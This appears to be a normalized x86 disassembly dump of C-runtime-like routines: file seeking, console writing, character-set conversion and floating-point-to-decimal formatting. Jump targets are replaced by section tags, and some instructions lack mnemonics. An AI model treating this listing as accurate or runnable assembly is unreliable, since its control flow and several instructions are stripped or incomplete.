jbe r-xdata
sub_43ecf3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_430f20
or edx 0xffffffff
pop ecx
mov eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_43ed7e
push 0xc
push r--data
call sub_40d270
xor eax eax
mov [ ebp - 0x1c ] ax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
movzx eax [ eax ]
push eax
call sub_43ee74
pop ecx
mov si ax
mov [ ebp - 0x1c ] si
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43edd0
mov ax si
call sub_40d2b6
retn 0xc
sub_43eddc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_43ed7e
mov esp ebp
pop ebp
retn
sub_43ee57
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x9
call sub_43eddc
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_43ee74
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_44600b
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_43eeb9
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0x1000
push ebx
call sub_42d3eb
push 0x0
mov [ esi + 0x4 ] eax
call sub_42d3b1
cmp [ esi + 0x4 ] 0x0
lea eax [ esi + 0xc ]
pop ecx
pop ecx
je r-xdata
mov ecx 0x400
[ eax ] ecx
lea eax [ esi + 0x14 ]
mov [ esi + 0x18 ] 0x2
mov [ esi + 0x4 ] eax
push 0x40
pop ecx
[ eax ] ecx
mov [ esi + 0x18 ] ebx
jmp r-xdata
mov eax [ esi + 0x4 ]
and [ esi + 0x8 ] 0x0
mov [ esi ] eax
pop esi
pop ebx
pop ebp
retn
sub_43ef16
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43ef3c
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43ef62
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
mov eax [ ebp - 0xc ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43efc7
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
push 0x40
jne r-xdata
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
pop eax
pop ebp
retn
sub_43eff7
mov edi edi
push ebp
mov ebp esp
push 0x107
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43f01d
mov edi edi
push ebp
mov ebp esp
push 0x103
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_43f137
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x9
push 0x40
jne r-xdata
push [ ebp + 0x8 ]
call sub_43d25c
pop ecx
pop ecx
pop ebp
retn
pop eax
pop ebp
retn
sub_43f210
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov edi [ ebp + 0x24 ]
test edi edi
jne r-xdata
push esi
push [ ebp + 0x14 ]
call sub_446041
pop ecx
cmp eax esi
pop ecx
lea esi [ eax + 0x1 ]
jl r-xdata
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
push 0x0
push esi
push [ ebp + 0x14 ]
setne al
lea eax [ eax * 8 + 0x1 ]
push eax
push edi
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edi [ eax + 0x8 ]
mov [ ebp + 0x24 ] edi
mov esi eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c38e
mov esp ebp
pop ebp
retn
lea edx [ eax + eax ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
xor ebx ebx
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
xor esi esi
push [ ebp - 0x8 ]
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d3eb
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_448dc0
mov ebx esp
test ebx ebx
je r-xdata
mov edi [ ebp - 0x8 ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42feb7
mov esi eax
test esi esi
je r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test [ ebp + 0x10 ] 0x400
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
jmp r-xdata
lea edx [ esi + esi ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
xor edi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_43a5a0
pop ecx
mov eax esi
cmp esi eax
jg r-xdata
push edi
call sub_43a5a0
pop ecx
push 0x0
push 0x0
push 0x0
push esi
push edi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42feb7
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_42d3eb
mov edi eax
pop ecx
test edi edi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_448dc0
mov edi esp
test edi edi
je r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push eax
push [ ebp + 0x1c ]
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42feb7
mov esi eax
test esi esi
jne r-xdata
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
mov [ edi ] 0xdddd
mov [ edi ] 0xcccc
jmp r-xdata
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
jmp r-xdata
push eax
push eax
test edi edi
je r-xdata
add edi 0x8
jmp r-xdata
push esi
push edi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call sub_43a5a0
pop ecx
jmp r-xdata
sub_43f42d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41cbf0
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_43f210
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_43f478
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
call sub_430f56
push 0x16
mov ecx [ ebp + 0x10 ]
mov [ edx ] 0x0
test ecx ecx
jle r-xdata
pop esi
pop ebp
retn
xor eax eax
mov eax ecx
jmp r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
call sub_430f56
push 0x22
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
push ebx
lea ebx [ edx + 0x1 ]
mov eax ebx
push edi
mov edi [ esi + 0x8 ]
mov [ edx ] 0x30
test ecx ecx
jle r-xdata
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov [ eax ] 0x0
test ecx ecx
js r-xdata
mov bl [ edi ]
test bl bl
je r-xdata
cmp [ edx ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
mov bl 0x30
inc edi
jmp r-xdata
mov ecx ebx
lea esi [ ecx + 0x1 ]
inc [ esi + 0x4 ]
jmp r-xdata
jmp r-xdata
lea ebx [ edx + 0x1 ]
mov [ eax ] bl
inc eax
dec ecx
test ecx ecx
jg r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
lea eax [ ecx + 0x1 ]
push eax
push ebx
push edx
call sub_416860
add esp 0xc
pop edi
xor eax eax
pop ebx
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_43f534
mov edi edi
push ebp
mov ebp esp
sub esp 0x950
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
and [ ebp - 0x76c ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x778 ] ecx
mov ecx edi
mov [ ebp - 0x77c ] eax
shr ecx 0x14
mov eax ecx
and eax 0x7ff
or eax 0x0
jne r-xdata
xor dl dl
mov esi 0x100000
xor eax eax
mov dl 0x1
xor esi esi
jmp r-xdata
xor eax eax
mov [ ebp - 0x768 ] eax
cmp eax 0x80000000
jne r-xdata
mov ebx [ ebp + 0x8 ]
and edi 0xfffff
fld [ ebp + 0x8 ]
add ebx eax
adc edi esi
xor eax eax
test dl dl
setne al
and ecx 0x7ff
inc eax
lea esi [ ecx - 0x434 ]
add esi eax
mov [ ebp - 0x74c ] esi
call sub_446160
push ecx
push ecx
fstp [ esp ]
call sub_446270
pop ecx
pop ecx
call sub_448e10
mov [ ebp - 0x768 ] eax
cmp eax 0x7fffffff
je r-xdata
cmp esi 0xfffffc02
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop esi
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] esi
cmp ebx esi
jne r-xdata
mov [ ebp - 0x1d0 ] ebx
xor ebx ebx
test edi edi
mov [ ebp - 0x1cc ] edi
setne bl
inc ebx
mov [ ebp - 0x1d4 ] ebx
test esi esi
js r-xdata
mov eax [ ebp + ebx * 4 - 0x1d4 ]
and [ ebp - 0x76c ] 0x0
bsr eax eax
je r-xdata
and [ ebp - 0x570 ] 0x0
push 0x2
pop ecx
mov [ ebp - 0x56c ] 0x100000
mov [ ebp - 0x574 ] ecx
cmp ebx ecx
jne r-xdata
mov ecx [ ebp - 0x74c ]
xor edx edx
inc ecx
mov eax ecx
and ecx 0x1f
shr eax 0x5
mov [ ebp - 0x758 ] eax
push 0x20
pop edi
mov eax edi
mov [ ebp - 0x764 ] ecx
sub eax ecx
mov [ ebp - 0x750 ] eax
xor eax eax
mov ecx [ ebp - 0x750 ]
inc eax
call sub_448df0
mov ecx [ ebp + ebx * 4 - 0x1d4 ]
dec eax
and [ ebp - 0x76c ] 0x0
bsr ecx ecx
mov [ ebp - 0x774 ] eax
not eax
mov [ ebp - 0x760 ] eax
je r-xdata
xor ecx ecx
xor ecx ecx
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor edx edx
xor eax eax
lea eax [ ecx + 0x1 ]
jmp r-xdata
add ecx 0x4
cmp ecx 0x8
jne r-xdata
xor al al
test al al
je r-xdata
push 0x20
pop eax
sub eax ecx
cmp eax 0x1
setb al
cmp ebx 0x73
mov [ ebp - 0x745 ] al
seta cl
cmp ebx 0x73
jne r-xdata
add edx 0x4
cmp edx 0x8
jne r-xdata
xor al al
test ch ch
je r-xdata
sub edi eax
mov eax [ ebp - 0x758 ]
cmp [ ebp - 0x764 ] edi
seta ch
lea edx [ ebx + eax ]
mov [ ebp - 0x745 ] ch
cmp edx 0x73
mov [ ebp - 0x74c ] edx
seta cl
cmp edx 0x73
jne r-xdata
mov eax [ ebp + ecx - 0x570 ]
cmp eax [ ebp + ecx - 0x1d0 ]
jne r-xdata
mov ecx [ ebp - 0x74c ]
xor edx edx
add ecx 0x2
mov eax ecx
and ecx 0x1f
shr eax 0x5
mov [ ebp - 0x758 ] eax
push 0x20
pop esi
mov eax esi
mov [ ebp - 0x764 ] ecx
sub eax ecx
mov [ ebp - 0x75c ] eax
xor eax eax
mov ecx [ ebp - 0x75c ]
inc eax
call sub_448df0
and [ ebp - 0x76c ] 0x0
dec eax
bsr ecx edi
mov [ ebp - 0x760 ] eax
not eax
mov [ ebp - 0x774 ] eax
je r-xdata
and [ ebp - 0x574 ] 0x0
lea eax [ ebp - 0x570 ]
and [ ebp - 0x1d4 ] 0x0
push 0x0
push eax
lea eax [ ebp - 0x1d0 ]
push 0x1cc
push eax
call sub_442e6b
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + edx - 0x570 ]
cmp eax [ ebp + edx - 0x1d0 ]
jne r-xdata
and [ ebp - 0x76c ] 0x0
bsr eax edi
je r-xdata
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
lea eax [ ecx + 0x1 ]
jmp r-xdata
neg eax
div ecx
mov [ ebp - 0x764 ] eax
mov ecx edx
mov [ ebp - 0x760 ] ecx
test eax eax
je r-xdata
div ecx
mov [ ebp - 0x764 ] eax
mov ecx edx
mov [ ebp - 0x76c ] ecx
test eax eax
je r-xdata
push 0x72
pop ecx
cmp ebx ecx
jae r-xdata
test cl cl
jne r-xdata
xor edx edx
lea edx [ eax + 0x1 ]
jmp r-xdata
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
jmp r-xdata
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test cl cl
jne r-xdata
xor cl cl
test cl cl
je r-xdata
sub esi eax
mov eax [ ebp - 0x758 ]
cmp [ ebp - 0x764 ] esi
seta cl
lea edx [ eax + 0x2 ]
mov [ ebp - 0x745 ] cl
cmp edx 0x73
mov [ ebp - 0x750 ] edx
seta ch
cmp edx 0x73
jne r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
test ecx ecx
je r-xdata
cmp eax 0x26
jbe r-xdata
cmp ecx 0xffffffff
je r-xdata
mov ecx ebx
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
push 0x20
pop eax
sub eax edx
mov esi ecx
cmp eax ecx
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x754 ] eax
mov edi eax
setb [ ebp - 0x745 ]
mov eax [ ebp - 0x768 ]
xor edx edx
push 0xa
pop ecx
mov [ ebp - 0x774 ] ecx
test eax eax
js r-xdata
mov ecx edx
mov [ ebp - 0x75c ] ecx
cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x74c ] ecx
xor eax eax
mov ebx 0x1cc
push eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test cl cl
jne r-xdata
mov cl 0x1
jmp r-xdata
mov edi [ ebp - 0x778 ]
mov esi edi
mov ecx [ ebp - 0x1d4 ]
mov [ ebp - 0x74c ] esi
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + r--data ]
mov [ ebp - 0x76c ] eax
test eax eax
je r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x74c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40dea0
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x74c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_40d920
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x758 ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
mov edi [ ecx * 4 + r--data ]
test edi edi
jne r-xdata
movzx ecx [ eax * 4 + r--data ]
movzx esi [ eax * 4 + r--data ]
mov edi ecx
mov [ ebp - 0x75c ] eax
shl edi 0x2
push edi
lea eax [ ecx + esi ]
mov [ ebp - 0x574 ] eax
lea eax [ ebp - 0x570 ]
push 0x0
push eax
call sub_40dea0
mov eax esi
shl eax 0x2
push eax
mov eax [ ebp - 0x75c ]
movzx eax [ eax * 4 + r--data ]
lea eax [ eax * 4 + r--data ]
push eax
lea eax [ ebp - 0x570 ]
add eax edi
push eax
call sub_40d920
mov ecx [ ebp - 0x574 ]
add esp 0x18
mov [ ebp - 0x74c ] ecx
cmp ecx 0x1
ja r-xdata
push 0x26
pop eax
cmp [ ebp - 0x745 ] 0x0
je r-xdata
lea edi [ ebp - 0x1d0 ]
mov esi ecx
lea edi [ edi + ecx * 4 ]
mov [ ebp - 0x754 ] edi
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov eax [ ebp - 0x758 ]
test eax eax
je r-xdata
mov esi [ ebp - 0x758 ]
mov edi edx
sub edi esi
lea edx [ ebp - 0x1d0 ]
lea edx [ edx + edi * 4 ]
push 0x72
pop ecx
cmp edx ecx
jb r-xdata
test ch ch
jne r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call sub_4409b0
pop ecx
pop ecx
push 0xa
pop edx
cmp eax edx
jne r-xdata
xor edi edi
xor esi esi
xor eax eax
push eax
mov [ ebp - 0x1d4 ] eax
mov [ ebp - 0x950 ] eax
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x1d4 ] 0x1
ja r-xdata
mov esi [ ebp - 0x570 ]
test esi esi
jne r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
jmp r-xdata
cmp [ ebp - 0x3a4 ] 0x1
ja r-xdata
mov esi [ ebp - 0x570 ]
test esi esi
jne r-xdata
mov [ ebp - 0x1d4 ] ecx
jmp r-xdata
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
and [ ebp - 0x750 ] 0x0
mov edx [ edi ]
mov [ ebp - 0x750 ] edx
jmp r-xdata
xor eax eax
cmp [ ebp - 0x745 ] al
setne al
add eax ecx
sub ecx [ ebp - 0x74c ]
mov edi ecx
mov [ ebp - 0x1d4 ] eax
shr edi 0x5
lea eax [ ebp - 0x570 ]
mov esi edi
mov [ ebp - 0x760 ] ecx
shl esi 0x2
push esi
push 0x0
push eax
call sub_40dea0
mov ecx [ ebp - 0x760 ]
xor eax eax
inc eax
and ecx 0x1f
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ edi + 0x1 ]
jmp r-xdata
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
shl eax 0x2
shr edx 0x1e
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx eax
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x74c ]
push 0x2
pop esi
cmp edi ebx
jae r-xdata
mov ecx edx
mov [ ebp - 0x754 ] ecx
cmp edx 0xffffffff
je r-xdata
mov edx ecx
mov [ ebp - 0x750 ] ecx
test eax eax
jne r-xdata
inc [ ebp - 0x768 ]
lea esi [ edi + 0x1 ]
mov eax [ ebp - 0x3a4 ]
mov [ edi ] 0x31
mov [ ebp - 0x74c ] esi
test eax eax
je r-xdata
mov eax [ ebp + esi * 4 - 0x1d0 ]
push 0xa
pop edx
mul edx
add eax edi
mov [ ebp + esi * 4 - 0x1d0 ] eax
adc edx 0x0
inc esi
mov edi edx
cmp esi ecx
jne r-xdata
mov esi [ ebp - 0x74c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x1d4 ]
test ecx ecx
je r-xdata
cmp ecx [ ebp - 0x1d4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x1d0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x1d4 ] ecx
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test edi edi
je r-xdata
cmp esi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x1d4 ] eax
push eax
lea eax [ ebp - 0x94c ]
jmp r-xdata
mov eax [ ebp - 0x3a4 ]
mov [ ebp - 0x76c ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x94c ]
push eax
lea eax [ ebp - 0x3a0 ]
jmp r-xdata
cmp ecx [ ebp - 0x3a4 ]
lea edi [ ebp - 0x570 ]
setb al
test al al
jne r-xdata
mov edi [ ebp - 0x3a0 ]
mov eax ecx
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
mov [ ebp - 0x3a4 ] ecx
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
test edi edi
jne r-xdata
cmp esi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x744 ] eax
mov [ ebp - 0x3a4 ] eax
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x570 ]
inc edi
sub edi esi
mov ebx edi
shr ebx 0x5
mov esi ebx
shl esi 0x2
push esi
push 0x0
push eax
call sub_40dea0
xor eax eax
and edi 0x1f
inc eax
mov ecx edi
shl eax cl
mov [ ebp + esi - 0x570 ] eax
lea eax [ ebx + 0x1 ]
xor edx edx
mov edx [ edi - 0x4 ]
jmp r-xdata
lea eax [ esi - 0x1 ]
cmp eax ebx
jae r-xdata
mov [ ebp - 0x574 ] eax
mov ebx 0x1cc
mov [ ebp - 0x3a4 ] eax
shl eax 0x2
push eax
lea eax [ ebp - 0x570 ]
push eax
lea eax [ ebp - 0x3a0 ]
push ebx
push eax
call sub_442e6b
add esp 0x1c
cmp esi ebx
jae r-xdata
mov [ ebp - 0x1d4 ] edx
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ ebp - 0x1d4 ] eax
jmp r-xdata
xor eax eax
mov eax [ edx ]
jmp r-xdata
test eax eax
je r-xdata
mov esi edx
lea eax [ ebp - 0x1d0 ]
mov edx [ ebp - 0x758 ]
sub esi edx
lea eax [ eax + esi * 4 ]
mov [ ebp - 0x74c ] eax
add al 0x30
lea esi [ edi + 0x1 ]
mov [ edi ] al
mov [ ebp - 0x74c ] esi
mov eax [ ebp - 0x768 ]
dec eax
jmp r-xdata
mov eax [ ebp - 0x768 ]
xor ecx ecx
mov esi eax
xor edi edi
mov edi esi
mov eax [ ebp - 0x1d4 ]
cmp eax 0x73
jae r-xdata
xor esi esi
xor edi edi
lea edx [ ebp - 0x1d0 ]
jmp r-xdata
lea edi [ ebp - 0x1d0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
mov al 0x1
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
xor ecx ecx
xor esi esi
push ebx
push eax
call sub_442e6b
add esp 0x10
lea edx [ ebp - 0x3a0 ]
jmp r-xdata
lea edi [ ebp - 0x3a0 ]
lea edx [ ebp - 0x570 ]
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push eax
lea eax [ ebp - 0x570 ]
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x3a4 ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x740 ]
mov esi [ ebp - 0x74c ]
mov ebx [ ebp - 0x1d4 ]
jmp r-xdata
mov eax [ ebp - 0x750 ]
sub edi 0x4
add eax eax
shr edx 0x1f
xor edx eax
mov eax [ ebp - 0x754 ]
dec esi
mov [ eax ] edx
sub eax 0x4
mov [ ebp - 0x754 ] eax
cmp esi 0xffffffff
je r-xdata
and [ ebp - 0x56c ] 0x0
xor eax eax
inc eax
mov [ ebp - 0x570 ] esi
mov [ ebp - 0x574 ] eax
mov [ ebp - 0x3a4 ] eax
push 0x4
jmp r-xdata
xor eax eax
mov eax [ edx - 0x4 ]
jmp r-xdata
mov [ ebp - 0x754 ] eax
lea eax [ edi - 0x1 ]
cmp eax ebx
jae r-xdata
cmp [ ebp - 0x745 ] 0x0
mov ebx 0x1cc
je r-xdata
mov ecx eax
lea edi [ ebp - 0x1d0 ]
xor eax eax
[ edi ]
mov edx [ ebp - 0x750 ]
mov eax [ ebp - 0x758 ]
cmp esi ebx
jae r-xdata
mov eax [ ebp + 0x1c ]
dec eax
cmp eax ecx
jb r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov ecx [ ebp - 0x77c ]
mov [ ecx ] eax
mov ecx [ ebp + 0x10 ]
test eax eax
js r-xdata
mov eax [ ebp + edi * 4 - 0x3a0 ]
mul edx
push 0xa
add eax ecx
mov [ ebp + edi * 4 - 0x3a0 ] eax
adc edx 0x0
inc edi
mov ecx edx
pop edx
cmp edi esi
jne r-xdata
mov esi [ ebp - 0x74c ]
test ecx ecx
je r-xdata
xor eax eax
push eax
mov [ ebp - 0x950 ] eax
mov [ ebp - 0x1d4 ] eax
lea eax [ ebp - 0x94c ]
push eax
lea eax [ ebp - 0x1d0 ]
push ebx
push eax
call sub_442e6b
add esp 0x10
mov [ ebp + eax * 4 - 0x1d0 ] edi
inc [ ebp - 0x1d4 ]
jmp r-xdata
mul [ ebp + edi * 4 - 0x1d0 ]
add eax esi
mov [ ebp + edi * 4 - 0x1d0 ] eax
mov eax [ ebp - 0x76c ]
adc edx 0x0
inc edi
mov esi edx
cmp edi ecx
jne r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x750 ] edx
test al al
jne r-xdata
mov [ ebp - 0x754 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x1d4 ]
cmp [ ebp - 0x1d4 ] 0x0
je r-xdata
and [ ebp - 0x950 ] 0x0
and [ ebp - 0x1d4 ] 0x0
push 0x0
jmp r-xdata
mov eax [ ebp - 0x764 ]
sub eax [ ebp - 0x74c ]
mov [ ebp - 0x764 ] eax
jne r-xdata
mov eax [ ebp - 0x1d4 ]
xor ecx ecx
mov [ ebp - 0x76c ] eax
xor edi edi
mov eax edi
mul [ ebp + esi * 4 - 0x3a0 ]
add eax ecx
mov [ ebp + esi * 4 - 0x3a0 ] eax
adc edx 0x0
inc esi
mov ecx edx
cmp esi [ ebp - 0x76c ]
jne r-xdata
test ecx ecx
je r-xdata
mov [ ebp - 0x750 ] edx
test al al
jne r-xdata
mov [ ebp - 0x754 ] ecx
test al al
je r-xdata
mov ecx [ ebp - 0x3a4 ]
